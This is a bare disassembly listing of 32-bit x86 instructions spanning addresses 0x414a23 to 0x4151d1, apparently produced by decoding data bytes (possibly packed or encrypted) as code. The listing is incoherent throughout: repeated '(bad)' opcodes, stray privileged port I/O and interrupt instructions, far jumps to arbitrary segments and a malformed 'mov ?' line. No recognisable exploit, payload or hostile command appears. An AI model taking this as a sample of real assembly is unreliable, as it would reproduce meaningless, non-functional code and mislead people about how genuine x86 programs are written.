  414a23:	cmp    bl,BYTE PTR [esi-0x10]
  414a26:	cdq    
  414a27:	add    dh,BYTE PTR [esi]
  414a29:	in     al,0xda
  414a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a2c:	sub    BYTE PTR [ecx-0x6fb0965e],ah
  414a32:	rcl    BYTE PTR [eax],0x93
  414a35:	xchg   esi,eax
  414a36:	test   al,0xc7
  414a38:	neg    BYTE PTR [edx+ebx*4]
  414a3b:	mov    BYTE PTR [esi],0x1
  414a3e:	jo     0x4149f8
  414a40:	mov    cl,0x98
  414a42:	adc    al,BYTE PTR [esi]
  414a44:	enter  0xd47b,0x1d
  414a48:	push   esi
  414a49:	mov    BYTE PTR [ebx],al
  414a4b:	loopne 0x414a90
  414a4d:	in     eax,dx
  414a4e:	or     DWORD PTR [ebp+0x77],0xffffffee
  414a52:	cmc    
  414a53:	xchg   esp,eax
  414a54:	mov    ebp,0x26ac2e8a
  414a59:	int    0x4f
  414a5b:	xchg   DWORD PTR [ecx+0x490f4961],edx
  414a61:	adc    al,0xe0
  414a63:	jb     0x414a7a
  414a65:	bound  esi,QWORD PTR [edx-0x2dc545bc]
  414a6b:	push   edx
  414a6c:	jne    0x4149ef
  414a6e:	test   DWORD PTR [ebx+0x1],ebp
  414a71:	add    bl,BYTE PTR [esi]
  414a73:	ins    BYTE PTR es:[edi],dx
  414a74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a75:	mul    dh
  414a77:	scas   eax,DWORD PTR es:[edi]
  414a78:	xor    eax,0x90db3c01
  414a7d:	cli    
  414a7e:	mov    ah,0x1b
  414a80:	test   bl,ah
  414a82:	mov    eax,ds:0x3c06ad2
  414a87:	xchg   DWORD PTR [ebx-0x64],edx
  414a8a:	add    DWORD PTR [ebp-0x5b6b4876],0xf74962be
  414a94:	inc    ebx
  414a95:	sbb    al,0xf7
  414a97:	imul   eax,DWORD PTR [eax+eiz*1-0x6745af86],0xffffffd2
  414a9f:	lods   al,BYTE PTR ds:[esi]
  414aa0:	ret    0x8956
  414aa3:	out    dx,eax
  414aa4:	popf   
  414aa5:	mov    eax,ds:0x700ba776
  414aaa:	rol    BYTE PTR [ecx],1
  414aac:	jmp    0x3346:0xbea8d18f
  414ab3:	xchg   esp,eax
  414ab4:	sbb    al,0x78
  414ab6:	xchg   ebx,eax
  414ab7:	jmp    0xc254b640
  414abc:	or     eax,0xab7507fe
  414ac1:	fistp  DWORD PTR [eax-0x4b8f74da]
  414ac7:	or     eax,0x851c0405
  414acc:	cmp    DWORD PTR [esi-0x73fa4232],ecx
  414ad2:	outs   dx,DWORD PTR ds:[esi]
  414ad3:	(bad)  
  414ad4:	mov    ds:0x8493c08d,eax
  414ad9:	pop    eax
  414ada:	push   0xc415d7ff
  414adf:	ret    0xcf19
  414ae2:	repz bound esp,QWORD PTR [eax+0x3c3522bd]
  414ae9:	add    bh,cl
  414aeb:	adc    al,0x98
  414aed:	sub    eax,DWORD PTR [esi+0x32]
  414af0:	into   
  414af1:	pop    ss
  414af2:	fstp   st(1)
  414af4:	dec    edi
  414af5:	ret    
  414af6:	pop    ebx
  414af7:	mov    eax,ds:0xe35bdf78
  414afc:	jl     0x414b43
  414afe:	mov    cl,0x45
  414b00:	test   al,0xbb
  414b02:	retf   0xb7c6
  414b05:	icebp  
  414b06:	ret    
  414b07:	lahf   
  414b08:	xchg   BYTE PTR [ecx+ebx*1-0x381d5774],cl
  414b0f:	cli    
  414b10:	sbb    edi,ecx
  414b12:	adc    al,0x19
  414b14:	loop   0x414b53
  414b16:	sbb    BYTE PTR [ecx+0x7a],ah
  414b19:	pop    esi
  414b1a:	jmp    FWORD PTR [ebp-0x7d]
  414b1d:	dec    esi
  414b1e:	pop    edi
  414b1f:	pop    edx
  414b20:	shl    BYTE PTR [ecx-0x2889d40f],cl
  414b26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b27:	in     al,dx
  414b28:	or     BYTE PTR [eax-0xfe064c0],bh
  414b2e:	xchg   DWORD PTR [ebx],esp
  414b30:	sbb    DWORD PTR [ebx+0x716e66f5],ecx
  414b36:	pusha  
  414b37:	test   edx,esi
  414b39:	mov    dh,BYTE PTR [ecx+0x1d]
  414b3c:	push   ds
  414b3d:	lods   al,BYTE PTR ds:[esi]
  414b3e:	rol    DWORD PTR [esi],cl
  414b40:	iret   
  414b41:	and    edi,DWORD PTR [edx+0x4]
  414b44:	rcl    BYTE PTR [ecx-0x6e2c387b],1
  414b4a:	popf   
  414b4b:	enter  0x82e9,0xd5
  414b4f:	lds    ebp,FWORD PTR [ecx]
  414b51:	call   0xe9c83500
  414b56:	in     al,0x54
  414b58:	xlat   BYTE PTR fs:[ebx]
  414b5a:	aad    0x10
  414b5c:	loopne 0x414afc
  414b5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b5f:	stc    
  414b60:	popf   
  414b61:	and    DWORD PTR [esi+0x76],edx
  414b64:	idiv   DWORD PTR [edx-0x5a3c7d2a]
  414b6a:	out    0xb8,al
  414b6c:	cmp    BYTE PTR [ebx+0x9],ch
  414b6f:	aam    0x10
  414b71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b72:	pushf  
  414b73:	jbe    0x414b90
  414b75:	or     eax,0x502af9c0
  414b7a:	mov    cl,0x63
  414b7c:	pop    edx
  414b7e:	enter  0xb887,0xdb
  414b82:	jecxz  0x414bae
  414b84:	mov    bh,0x22
  414b86:	(bad)  
  414b87:	rol    esi,cl
  414b89:	jecxz  0x414b66
  414b8b:	ret    
  414b8c:	xchg   esp,eax
  414b8d:	jmp    0x414b26
  414b8f:	and    DWORD PTR [esi+0x2c],ebp
  414b92:	push   0xffffffec
  414b94:	cmc    
  414b95:	shl    ah,1
  414b97:	les    ebp,FWORD PTR [esi-0x60]
  414b9a:	mov    ds:0x39d96373,eax
  414b9f:	enter  0xf99c,0x49
  414ba3:	cmp    BYTE PTR [edx+edi*4],bh
  414ba6:	fistp  WORD PTR [eax-0x28]
  414ba9:	pop    esi
  414baa:	ret    
  414bab:	out    0x42,eax
  414bad:	outs   dx,DWORD PTR ds:[esi]
  414bae:	jne    0x414c04
  414bb0:	inc    esi
  414bb1:	into   
  414bb2:	sub    al,ch
  414bb4:	imul   esp,DWORD PTR [ecx+0x96ec03c],0x4e
  414bbb:	shr    DWORD PTR [ecx-0x62],0x4a
  414bbf:	jno    0x414bcb
  414bc1:	je     0x414b91
  414bc3:	jge    0x414c14
  414bc5:	jno    0x414b90
  414bc7:	jb     0x414b91
  414bc9:	pusha  
  414bca:	inc    ecx
  414bcb:	scas   al,BYTE PTR es:[edi]
  414bcc:	fld    TBYTE PTR [esi+0x39e0a1c4]
  414bd2:	cmp    DWORD PTR [ebx],0x5
  414bd5:	test   eax,0x641d6fd6
  414bda:	pusha  
  414bdb:	call   0x620c:0xb3c82d01
  414be2:	cmp    esp,edi
  414be4:	loop   0x414bcc
  414be6:	push   ebx
  414be7:	jbe    0x414c08
  414be9:	enter  0xa74e,0x5a
  414bed:	out    dx,eax
  414bee:	mov    bh,0x16
  414bf0:	push   es
  414bf1:	outs   dx,BYTE PTR ds:[esi]
  414bf2:	ins    DWORD PTR es:[edi],dx
  414bf3:	test   BYTE PTR [eax-0x74],ah
  414bf6:	pop    ebx
  414bf7:	jns    0x414b84
  414bf9:	cld    
  414bfa:	jne    0x414c40
  414bfc:	fistp  WORD PTR [ecx-0x3c650baf]
  414c02:	test   DWORD PTR [edi-0x3d24e794],0x45db113a
  414c0c:	or     esi,DWORD PTR [ecx+edi*8]
  414c0f:	xchg   ebp,eax
  414c10:	sbb    eax,0x6f21e7a8
  414c15:	sbb    DWORD PTR [ecx+esi*8],ecx
  414c18:	jg     0x414bc3
  414c1a:	rcr    DWORD PTR [ebx+ebx*8],cl
  414c1d:	inc    ecx
  414c1e:	cmp    cx,bx
  414c21:	pushf  
  414c22:	in     eax,dx
  414c23:	inc    ebx
  414c24:	jg     0x414c4f
  414c26:	jmp    0x6a4e:0x5aac3c4a
  414c2d:	test   BYTE PTR [esi],bl
  414c2f:	cmp    ch,BYTE PTR [eax+0xcd9a5e7]
  414c35:	sar    DWORD PTR [edi+edx*2+0x4e],0xf5
  414c3a:	sub    esi,DWORD PTR [edi+0xedb90e4]
  414c40:	or     al,0xed
  414c42:	pushf  
  414c43:	push   ecx
  414c44:	xor    eax,0xcdd1ac44
  414c49:	push   edx
  414c4a:	jmp    0x414beb
  414c4c:	add    BYTE PTR [edi-0x22],dh
  414c4f:	and    DWORD PTR [ebx-0x16],0x3ff6def0
  414c56:	jge    0x414c1a
  414c58:	jg     0x414c6e
  414c5a:	arpl   WORD PTR [eax+0x33],bp
  414c5d:	cmp    esi,esi
  414c5f:	or     BYTE PTR [eax+edi*8-0x5c53e748],0xdd
  414c67:	sbb    al,0x96
  414c69:	jb     0x414bfd
  414c6b:	sbb    ebp,DWORD PTR cs:[edi]
  414c6e:	mov    ss,WORD PTR [eax+ebp*4+0x1e]
  414c72:	cmc    
  414c73:	cmp    BYTE PTR [ebx],0x1c
  414c76:	in     al,dx
  414c77:	dec    DWORD PTR [edx-0x453000c7]
  414c7d:	add    dl,BYTE PTR gs:[ebp+0x53]
  414c81:	pop    edi
  414c82:	jmp    0xc45b8820
  414c87:	loopne 0x414c46
  414c89:	jae    0x414cdb
  414c8b:	dec    esp
  414c8c:	(bad)  
  414c8d:	jl     0x414c4a
  414c8f:	xchg   ecx,eax
  414c90:	pushf  
  414c91:	add    ch,BYTE PTR [eax+0x67b3fa16]
  414c97:	dec    eax
  414c98:	(bad)  
  414c99:	fsubr  QWORD PTR [esi-0x728a0258]
  414c9f:	and    DWORD PTR [bx+si],esp
  414ca2:	adc    esi,DWORD PTR [edi-0x16]
  414ca5:	sbb    esi,DWORD PTR [ecx+eax*2]
  414ca8:	jmp    0x2b1f:0xce0f321c
  414caf:	pop    ds
  414cb0:	inc    eax
  414cb1:	inc    ebp
  414cb2:	outs   dx,BYTE PTR ds:[esi]
  414cb3:	jmp    ecx
  414cb5:	cmp    al,0xc5
  414cb7:	sbb    dh,BYTE PTR [eax+0x2a2b3d29]
  414cbd:	mov    ah,0x96
  414cbf:	jno    0x414d1a
  414cc1:	popa   
  414cc2:	(bad)  
  414cc3:	xor    DWORD PTR [ebx+0x78],eax
  414cc6:	and    bl,BYTE PTR [edi+edi*8+0x62]
  414cca:	push   edx
  414ccb:	fld1   
  414ccd:	(bad)  
  414cce:	jbe    0x414c8a
  414cd0:	push   esp
  414cd1:	(bad)  
  414cd2:	mov    ah,0x57
  414cd4:	leave  
  414cd5:	jl     0x414c9e
  414cd7:	das    
  414cd8:	jmp    0x542b:0xb1cb6d66
  414cdf:	mov    bl,0x1d
  414ce1:	cmp    edi,esp
  414ce3:	dec    eax
  414ce4:	sub    DWORD PTR [ebp-0x7f],eax
  414ce7:	sbb    BYTE PTR [esi],ch
  414ce9:	mov    eax,ds:0xa2c290d5
  414cee:	dec    edi
  414cef:	xor    ebx,ebp
  414cf1:	js     0x414cb8
  414cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cf4:	in     al,dx
  414cf5:	ficom  WORD PTR [eax-0x60ef0bdd]
  414cfb:	jmp    0x414d76
  414cfd:	mov    bl,0x8e
  414cff:	jmp    0x7b1d:0xe78ea833
  414d06:	iret   
  414d07:	sbb    DWORD PTR [edi+0x14229768],0x932b7859
  414d11:	nop
  414d12:	add    al,0x97
  414d14:	in     eax,dx
  414d15:	rol    BYTE PTR [ebp+0x6e],cl
  414d18:	int3   
  414d19:	jg     0x414d6e
  414d1b:	aas    
  414d1c:	loopne 0x414cac
  414d1e:	addr16 and al,0x56
  414d21:	xchg   edx,eax
  414d22:	xchg   esp,ecx
  414d24:	daa    
  414d25:	add    eax,0xa412e962
  414d2a:	fs int3 
  414d2c:	pop    edi
  414d2d:	push   0xffffff8d
  414d2f:	outs   dx,DWORD PTR ds:[esi]
  414d30:	retf   
  414d31:	push   ecx
  414d32:	dec    ecx
  414d33:	(bad)  
  414d34:	fistp  QWORD PTR [edi+0x8]
  414d37:	xchg   ebx,eax
  414d38:	pop    es
  414d39:	xor    bh,BYTE PTR [ebx-0x10]
  414d3c:	hlt    
  414d3d:	xor    ebp,esi
  414d3f:	ins    BYTE PTR es:[edi],dx
  414d40:	mov    dh,0xb9
  414d42:	sbb    eax,0x4a15eead
  414d47:	cdq    
  414d48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d49:	les    ecx,FWORD PTR [esi+0x53]
  414d4c:	mov    ch,0xad
  414d4e:	inc    esp
  414d4f:	scas   eax,DWORD PTR es:[edi]
  414d50:	jb     0x414dc4
  414d52:	shr    dh,0x98
  414d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d56:	int    0x7d
  414d58:	retf   
  414d59:	jns    0x414d8d
  414d5b:	pushf  
  414d5c:	xchg   edi,eax
  414d5d:	xor    dh,BYTE PTR [esi]
  414d5f:	jnp    0x414d46
  414d61:	mov    eax,0x722692aa
  414d66:	cld    
  414d67:	cli    
  414d68:	mov    bh,BYTE PTR [esp+ebp*4]
  414d6b:	ret    0xe762
  414d6e:	es inc edx
  414d70:	(bad)  
  414d71:	lock imul eax,DWORD PTR [esi-0x2b9f9135],0xffffffda
  414d79:	loope  0x414d5a
  414d7b:	int    0xaf
  414d7d:	mov    sp,0x3558
  414d81:	xor    ebp,eax
  414d83:	(bad)  
  414d84:	icebp  
  414d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d86:	fdivr  DWORD PTR [edi-0x62]
  414d89:	(bad)  
  414d8b:	push   es
  414d8c:	js     0x414d93
  414d8e:	ja     0x414d2a
  414d90:	xlat   BYTE PTR ds:[ebx]
  414d91:	sbb    eax,0x8436fe0f
  414d96:	std    
  414d97:	inc    ecx
  414d98:	das    
  414d99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d9a:	mov    ds:0x5702d22,al
  414d9f:	push   edi
  414da0:	aaa    
  414da1:	or     DWORD PTR [ecx-0x26],edx
  414da4:	xor    esi,edx
  414da6:	pop    eax
  414da7:	pusha  
  414da8:	repnz pop es
  414daa:	sub    ah,dh
  414dac:	outs   dx,BYTE PTR ds:[esi]
  414dad:	dec    eax
  414dae:	mov    ebx,edi
  414db0:	loopne 0x414e09
  414db2:	outs   dx,DWORD PTR ds:[esi]
  414db3:	xchg   edx,eax
  414db4:	and    edi,DWORD PTR [edx]
  414db6:	push   edx
  414db7:	xor    bl,dl
  414db9:	jmp    0x9bdcca99
  414dbe:	jg     0x414e15
  414dc0:	push   ss
  414dc1:	xlat   BYTE PTR ds:[ebx]
  414dc2:	(bad)  
  414dc3:	fcmovnbe st,st(3)
  414dc5:	lahf   
  414dc6:	push   ebp
  414dc7:	cmc    
  414dc8:	rcr    DWORD PTR [edx-0x62709b92],cl
  414dce:	mov    ebx,DWORD PTR [esi]
  414dd0:	xor    esi,0x3027cb2c
  414dd6:	and    BYTE PTR [edi],0xe8
  414dd9:	iret   
  414dda:	in     eax,0xb5
  414ddc:	push   cs
  414ddd:	popa   
  414dde:	cmp    cl,al
  414de0:	outs   dx,BYTE PTR ds:[esi]
  414de1:	and    DWORD PTR [ebx+0x2426818b],0x59
  414de8:	xchg   ch,dl
  414dea:	xchg   edx,eax
  414deb:	jns    0x414da6
  414ded:	xchg   edx,eax
  414dee:	mov    eax,0xbbbf8768
  414df3:	enter  0x6eba,0x10
  414df7:	dec    esp
  414df8:	jmp    0xdc1bba41
  414dfd:	popf   
  414dfe:	xchg   DWORD PTR [bp+di-0x7bd8],ecx
  414e03:	and    DWORD PTR [eax+0x68],ebx
  414e06:	push   esp
  414e07:	faddp  st(7),st
  414e09:	xchg   esp,eax
  414e0a:	push   0xf7dbd023
  414e0f:	scas   al,BYTE PTR es:[edi]
  414e10:	(bad)  
  414e11:	jecxz  0x414e6d
  414e13:	lahf   
  414e14:	jo     0x414e83
  414e16:	sbb    al,0x92
  414e18:	push   edx
  414e19:	std    
  414e1a:	mov    esp,0x74c85be4
  414e1f:	or     DWORD PTR [edx],0x65bbd9b6
  414e25:	xchg   ebp,eax
  414e26:	push   ebp
  414e27:	dec    eax
  414e28:	and    DWORD PTR [esp+eiz*4+0xc3cf3b9],eax
  414e2f:	scas   eax,DWORD PTR es:[edi]
  414e30:	shl    ecx,cl
  414e32:	ss jle 0x414dbc
  414e35:	(bad)
  414e3a:	sbb    BYTE PTR [ebx+eiz*1+0x2b],bl
  414e3e:	imul   edi,DWORD PTR [ecx-0x66ba74bb],0xa5450062
  414e48:	push   ebp
  414e49:	jae    0x414dfe
  414e4b:	push   ss
  414e4c:	ja     0x414e55
  414e4e:	(bad)  [ebx-0x6fc85092]
  414e54:	cwde   
  414e55:	jle    0x414ddc
  414e57:	(bad)
  414e5c:	xor    bl,ah
  414e5e:	lds    ecx,FWORD PTR [eax]
  414e60:	xor    BYTE PTR [eax],ch
  414e62:	repnz pop es
  414e64:	push   ebp
  414e65:	and    BYTE PTR [esp+ebx*1-0x27],0x53
  414e6a:	sub    DWORD PTR [edi+0x13],ebx
  414e6d:	xchg   ebp,eax
  414e6e:	aas    
  414e6f:	adc    DWORD PTR [ebp+0x61],ebp
  414e72:	mov    ch,0xc6
  414e74:	dec    ecx
  414e75:	jbe    0x414df9
  414e77:	popa   
  414e78:	in     al,0xf4
  414e7a:	cdq    
  414e7b:	cwde   
  414e7c:	adc    ecx,DWORD PTR [ecx]
  414e7e:	jl     0x414e7b
  414e80:	pop    eax
  414e81:	add    ebp,edi
  414e83:	les    esp,FWORD PTR [ebx+ebx*2+0xbf0b93f]
  414e8a:	add    al,dl
  414e8c:	out    0xbe,eax
  414e8e:	icebp  
  414e8f:	mov    bl,0xd9
  414e91:	fild   WORD PTR [edx+0x54]
  414e94:	scas   al,BYTE PTR es:[edi]
  414e95:	mov    ch,0x22
  414e97:	jge    0x414ef9
  414e99:	daa    
  414e9a:	jl     0x414e64
  414e9c:	sbb    BYTE PTR [esp+ecx*8+0x4d9078f0],ch
  414ea3:	xor    DWORD PTR [edx+0x25fab2e2],esi
  414ea9:	call   0x817eb23d
  414eae:	iret   
  414eaf:	adc    edi,DWORD PTR ds:0xab34540a
  414eb5:	loope  0x414ed6
  414eb7:	pop    ds
  414eb8:	xor    BYTE PTR fs:[esi],bl
  414ebb:	in     eax,0x5a
  414ebd:	mov    al,ds:0xf3bda100
  414ec2:	ins    DWORD PTR es:[edi],dx
  414ec3:	xor    BYTE PTR [edx],bh
  414ec5:	daa    
  414ec6:	daa    
  414ec7:	lds    esi,FWORD PTR [edi+edi*4+0x61909916]
  414ece:	daa    
  414ecf:	js     0x414ea2
  414ed1:	mov    bh,0xa0
  414ed3:	push   eax
  414ed4:	les    eax,FWORD PTR [eax+esi*8+0x25348e9d]
  414edb:	out    dx,al
  414edc:	es pop esp
  414ede:	scas   eax,DWORD PTR es:[edi]
  414edf:	pop    edi
  414ee0:	cmp    edi,DWORD PTR [edi+0x5f]
  414ee3:	ja     0x414e86
  414ee5:	inc    edx
  414ee7:	iret   
  414ee8:	dec    ebp
  414ee9:	cmc    
  414eea:	jg     0x414ebe
  414eec:	daa    
  414eed:	stos   BYTE PTR es:[edi],al
  414eee:	mov    al,BYTE PTR [ebx]
  414ef0:	pushf  
  414ef1:	or     BYTE PTR [edi+edx*1+0x40152da3],dl
  414ef8:	xor    dl,BYTE PTR fs:[esi-0x3e632fca]
  414eff:	fadd   DWORD PTR [ecx+0x77]
  414f02:	outs   dx,BYTE PTR ds:[esi]
  414f03:	jle    0x414e9c
  414f05:	call   0xe16:0xbbcb5ad7
  414f0c:	push   ds
  414f0d:	out    0x27,eax
  414f0f:	jle    0x414ecb
  414f11:	push   0xfd274c62
  414f16:	push   ecx
  414f17:	pop    edx
  414f18:	rol    BYTE PTR [esi],1
  414f1a:	push   eax
  414f1b:	jmp    0x17ff6230
  414f20:	repnz or bh,BYTE PTR [ecx]
  414f23:	sbb    BYTE PTR [edx-0x6a],dh
  414f26:	fstp   DWORD PTR [edx-0x6e427398]
  414f2c:	out    0x1d,ax
  414f2f:	aaa    
  414f30:	add    DWORD PTR [ebp-0x4d6fd99b],ebx
  414f36:	push   ecx
  414f37:	push   esp
  414f38:	add    al,0x3f
  414f3a:	pop    ebp
  414f3b:	inc    ebx
  414f3c:	jl     0x414fa1
  414f3e:	test   BYTE PTR [ebx-0x2b],bl
  414f41:	jp     0x414f13
  414f43:	inc    ebp
  414f44:	out    0x93,al
  414f46:	inc    DWORD PTR [eax-0x613b2770]
  414f4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f4d:	jecxz  0x414fcb
  414f4f:	fisttp DWORD PTR fs:[edi+0x48]
  414f53:	inc    edx
  414f54:	sub    eax,0x853cba7b
  414f59:	shr    dl,cl
  414f5b:	jecxz  0x414f08
  414f5d:	push   esp
  414f5e:	cmp    BYTE PTR [esi+edi*8],ch
  414f61:	(bad)  
  414f62:	jl     0x414f5e
  414f64:	jno    0x414f70
  414f66:	or     esi,DWORD PTR [ebp+ecx*1+0x24]
  414f6a:	jecxz  0x414fd1
  414f6c:	ss inc ebp
  414f6e:	test   eax,0x7a085b91
  414f73:	sub    BYTE PTR [eax+0x0],al
  414f76:	fbstp  TBYTE PTR [edi+0x14]
  414f79:	data16 lods al,BYTE PTR ds:[esi]
  414f7b:	dec    edx
  414f7c:	pusha  
  414f7d:	pop    ebp
  414f7e:	shr    BYTE PTR ds:0xa6e8a990,cl
  414f84:	xchg   esi,eax
  414f85:	mov    bh,0x23
  414f87:	pop    ebp
  414f88:	mov    ecx,0x26d84d3
  414f8d:	sahf   
  414f8e:	cmp    eax,0x72bde939
  414f93:	mov    ?,WORD PTR [ecx+0x5]
  414f96:	mov    edx,DWORD PTR [eax]
  414f98:	sbb    eax,0x14cb2fce
  414f9d:	and    ebx,DWORD PTR [ecx+ecx*4-0x1ff04f0c]
  414fa4:	pop    esp
  414fa5:	pop    di
  414fa7:	aas    
  414fa8:	mov    esi,0xb3beac02
  414fad:	(bad)  
  414fae:	xchg   ebp,eax
  414faf:	adc    ch,0x51
  414fb2:	in     eax,dx
  414fb3:	dec    edx
  414fb4:	mov    dl,0x81
  414fb6:	clc    
  414fb7:	xchg   edi,eax
  414fb8:	jle    0x414ffe
  414fba:	pop    ds
  414fbb:	mov    dl,BYTE PTR [ecx-0x73]
  414fbe:	pop    ss
  414fbf:	addr16 dec esp
  414fc1:	ja     0x414f80
  414fc3:	test   DWORD PTR ds:0xf177e197,ecx
  414fc9:	sub    dh,BYTE PTR ds:0x13985f4b
  414fcf:	(bad)  
  414fd0:	push   ss
  414fd1:	or     eax,DWORD PTR [ebx-0x35d11987]
  414fd7:	xchg   ebx,eax
  414fd8:	add    al,0x33
  414fda:	jb     0x414f62
  414fdc:	rcr    BYTE PTR [ebx+0x6e],0xff
  414fe0:	xor    DWORD PTR [ebx+0xf],eax
  414fe3:	add    DWORD PTR [eax],edi
  414fe5:	nop
  414fe6:	(bad)  
  414fe7:	into   
  414fe8:	aaa    
  414fe9:	cmp    ebp,DWORD PTR [edi+edx*4-0x2bf297c9]
  414ff0:	fcom   DWORD PTR [eax]
  414ff2:	or     BYTE PTR [edx],bl
  414ff4:	lds    edi,FWORD PTR [esi+0x2db1199d]
  414ffa:	loop   0x415056
  414ffc:	jns    0x414fc4
  414ffe:	sbb    eax,0x86f2ee27
  415003:	ficomp DWORD PTR [edi+0x65]
  415006:	sub    DWORD PTR [edi+0x7a11088d],0x50ffa00
  415010:	aam    0x17
  415012:	mov    bl,0xa6
  415014:	ret    
  415015:	sub    al,0x2b
  415017:	pop    edi
  415018:	sub    BYTE PTR ds:0x31d91961,0x65
  41501f:	std    
  415020:	jl     0x415088
  415022:	push   ss
  415023:	pop    edi
  415024:	cs (bad) 
  415026:	imul   BYTE PTR [edi-0x16d886e7]
  41502c:	ss in  al,0xd8
  41502f:	out    0xac,eax
  415031:	ret    
  415032:	push   ds
  415033:	xchg   DWORD PTR [ecx+0x62a0c7da],ebx
  415039:	and    eax,0x12b624a
  41503e:	xor    ebx,0x1c6e3406
  415044:	test   al,0xc0
  415046:	inc    esi
  415047:	jne    0x415027
  415049:	add    eax,0xd2ddad56
  41504e:	sti    
  41504f:	scas   al,BYTE PTR es:[edi]
  415050:	mov    dh,0x1f
  415052:	outs   dx,BYTE PTR ds:[esi]
  415053:	fist   WORD PTR [ebx]
  415055:	sub    eax,0x7d653e0d
  41505a:	add    DWORD PTR [edx+0x561c4fcf],0xffffffe5
  415061:	add    al,0x27
  415063:	enter  0x74b9,0xaf
  415067:	mov    ds:0xf2f69b36,eax
  41506c:	xor    BYTE PTR [edx-0x1da9e8f7],al
  415072:	mov    dl,0x4d
  415074:	and    al,0xbb
  415076:	lds    ecx,FWORD PTR ds:0xa777c7eb
  41507c:	sbb    DWORD PTR ds:0x8cbaad5b,0xeee721aa
  415086:	dec    esp
  415087:	das    
  415088:	mov    al,0xbe
  41508a:	xchg   esi,eax
  41508b:	icebp  
  41508c:	sub    cl,dh
  41508e:	ja     0x4150d6
  415090:	push   ebx
  415091:	cdq    
  415092:	xor    al,0xf5
  415094:	pop    esi
  415095:	test   BYTE PTR [ebx+0x1f],0xdb
  415099:	loope  0x4150fa
  41509b:	in     al,0xf3
  41509d:	jp     0x415043
  41509f:	enter  0x2ea,0xf0
  4150a3:	ins    BYTE PTR es:[edi],dx
  4150a4:	push   es
  4150a5:	in     al,0xe0
  4150a7:	in     al,0x76
  4150a9:	call   0xa269:0x5c8614b7
  4150b0:	pop    edx
  4150b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150b2:	(bad)  [esi+0x4]
  4150b5:	xor    eax,0xdca8ff48
  4150ba:	dec    esi
  4150bc:	jge    0x41504f
  4150be:	xor    eax,0x71c60604
  4150c3:	jo     0x4150b6
  4150c5:	mov    cl,0x70
  4150c7:	or     eax,0xc74dad54
  4150cc:	sar    DWORD PTR [esi-0x7e],cl
  4150cf:	into   
  4150d0:	cld    
  4150d1:	test   DWORD PTR [edi+0x3e],edx
  4150d4:	(bad)  
  4150d5:	out    dx,eax
  4150d6:	dec    edx
  4150d7:	(bad)  ds:0x9c5d3a25
  4150dd:	push   es
  4150de:	in     eax,0xc
  4150e0:	sbb    al,BYTE PTR [esi-0x47]
  4150e3:	dec    esp
  4150e4:	dec    eax
  4150e5:	jmp    0xb22a:0xe2773019
  4150ec:	fsubr  QWORD PTR [esi]
  4150ee:	push   edx
  4150ef:	jge    0x41513e
  4150f1:	mov    WORD PTR [edi+0x5b],fs
  4150f4:	cmc    
  4150f5:	xor    DWORD PTR [edx-0xcc5f3b3],edi
  4150fb:	push   0x97ea1b7e
  415100:	cli    
  415101:	xlat   BYTE PTR ds:[ebx]
  415102:	cmp    ebx,ecx
  415104:	cld    
  415105:	lds    ecx,FWORD PTR [esi+0xd]
  415108:	or     al,0xec
  41510a:	xor    DWORD PTR [edi+0x3f],0x675e987a
  415111:	(bad)  
  415112:	sub    dl,BYTE PTR [ebx]
  415114:	adc    ch,BYTE PTR [edi-0x19]
  415117:	mov    BYTE PTR [ecx+0x19f23ada],al
  41511d:	arpl   WORD PTR ds:0xa4df267a,bx
  415123:	loopne 0x415173
  415125:	and    eax,DWORD PTR [ebx-0x49]
  415128:	fcom   QWORD PTR [ebx]
  41512a:	pop    eax
  41512b:	mov    esp,0x3c77cfd8
  415130:	jb     0x41515a
  415132:	imul   edi,esp,0xffffffcf
  415135:	mov    esp,0x82e0de9c
  41513a:	cmp    eax,0x8b04b844
  41513f:	jbe    0x41518d
  415141:	lock push eax
  415143:	add    DWORD PTR [eax+eiz*4-0x814f8f4],ebx
  41514a:	dec    esp
  41514b:	add    DWORD PTR [esi],ebx
  41514d:	call   0x41f4d3c2
  415152:	loopne 0x4151bc
  415154:	inc    esp
  415155:	lock fld DWORD PTR [ecx-0x5e45c6bc]
  41515c:	jmp    0x4150fd
  41515e:	in     al,0xe4
  415160:	jl     0x4150e5
  415162:	test   DWORD PTR [ecx],edx
  415164:	push   eax
  415165:	stc    
  415166:	xor    esi,DWORD PTR ds:0xdf720c29
  41516c:	test   DWORD PTR [edi+0xa],ebp
  41516f:	fcmovbe st,st(6)
  415171:	inc    ecx
  415172:	cmp    ebp,DWORD PTR [ebx+0x3ddfc7ea]
  415178:	pop    esi
  415179:	cmp    ebx,DWORD PTR [eax-0x6424f2f5]
  41517f:	or     al,0xed
  415181:	popa   
  415182:	daa    
  415183:	mov    ebx,0x2df63dc8
  415188:	ret    
  415189:	test   eax,0x79e32b17
  41518e:	call   0x4725:0x8f319671
  415195:	clc    
  415196:	ds push edi
  415198:	push   0x753e5f22
  41519d:	into   
  41519e:	and    bh,BYTE PTR [ecx]
  4151a0:	or     dh,BYTE PTR [ecx]
  4151a2:	cld    
  4151a3:	cmp    eax,0xc6018417
  4151a8:	mov    bh,0xea
  4151aa:	jns    0x415162
  4151ac:	stos   BYTE PTR es:[edi],al
  4151ad:	dec    edx
  4151ae:	pushf  
  4151af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151b0:	mov    esp,0x620ca836
  4151b5:	ss dec eax
  4151b7:	in     eax,dx
  4151b8:	stc    
  4151b9:	lods   al,BYTE PTR ds:[esi]
  4151ba:	jns    0x415169
  4151bc:	(bad)  
  4151bd:	in     al,0x3e
  4151bf:	std    
  4151c0:	mov    ecx,0x3564e530
  4151c5:	sub    DWORD PTR [edx-0x3c2ed7a6],eax
  4151cb:	in     eax,0xd
  4151cd:	and    BYTE PTR [ebp+0x5d],dh
  4151d0:	pushf  
  4151d1:	xchg   edx,eax
